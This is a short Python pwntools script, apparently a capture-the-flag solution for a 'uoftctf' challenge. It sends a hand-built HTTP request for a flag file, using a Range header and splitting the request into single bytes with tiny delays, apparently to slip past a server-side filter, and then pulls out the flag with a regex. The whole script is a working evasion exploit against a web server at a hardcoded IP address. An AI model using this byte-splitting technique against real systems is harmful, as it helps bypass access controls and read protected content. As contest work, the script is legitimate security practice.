from pwn import *
import socket
import time
import re

HOST = "35.227.38.232"
PORT = 5000
OFFSET = open("flag.html").read().index(":")

r = remote(HOST, PORT)
r.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

req = f'''
GET /flag.html HTTP/1.1
Host: {HOST}
Range: bytes={OFFSET}-
Connection: close
'''

req = f"{req.strip().replace('\n', '\r\n')}\r\n\r\n".encode()

for b in req:
    r.send(bytes([b]))
    time.sleep(0.0005)

data = r.recvall(timeout=2).decode()
r.close()

flag = re.findall(r'(uoftctf{.+})', data)[0]
print("Flag:", flag)